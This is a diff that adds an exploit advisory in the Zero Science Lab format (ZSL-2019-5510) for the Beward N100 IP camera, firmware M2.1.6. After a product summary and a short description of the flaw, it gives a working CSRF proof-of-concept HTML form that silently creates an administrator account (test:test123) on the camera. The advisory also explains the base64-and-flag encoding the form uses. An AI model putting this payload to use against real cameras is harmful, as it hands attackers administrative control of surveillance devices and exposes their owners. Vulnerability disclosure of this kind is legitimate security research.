@@ -1,0 +1,51 @@
+BEWARD N100 H.264 VGA IP Camera M2.1.6 CSRF Add Admin Exploit
+
+
+Vendor: Beward R&D Co., Ltd
+Product web page: https://www.beward.net
+Affected version: M2.1.6.04C014
+
+Summary: The N100 compact color IP camera with support for a more efficient
+compression format is optimized for low-speed networks, thanks to which it
+transmits a real-time image over the network with minimal delays. The camera
+supports the switching of the broadcast modes, and in the event of a break in
+communication with the remote file storage, it can continue recording to the
+microSDHC memory card. N100 is easy to install and configure, has all the
+necessary arsenal for the organization of low-cost professional video surveillance
+systems.
+
+Desc: The application interface allows users to perform certain actions via
+HTTP requests without performing any validity checks to verify the requests.
+This can be exploited to perform certai actions with administrative privileges
+if a logged-in user visits a malicious web site.
+
+Tested on: Boa/0.94.14rc21
+           Farady ARM Linux 2.6
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2019-5510
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5510.php
+
+
+26.01.2019
+
+--
+
+
+<html>
+  <body>
+    <form action="http://TARGET/cgi-bin/admin/param">
+      <input type="hidden" name="action" value="add" />
+      <input type="hidden" name="group" value="General.UserID" />
+      <input type="hidden" name="template" value="UserID" />
+      <input type="hidden" name="General.UserID.U.User" value="dGVzdDp0ZXN0MTIz,01000001" />
+      <input type="submit" value="Send" />
+    </form>
+  </body>
+</html>
+
+Base64(test:test123) + ,01000001 for A (Admin) = dGVzdDp0ZXN0MTIz,01000001
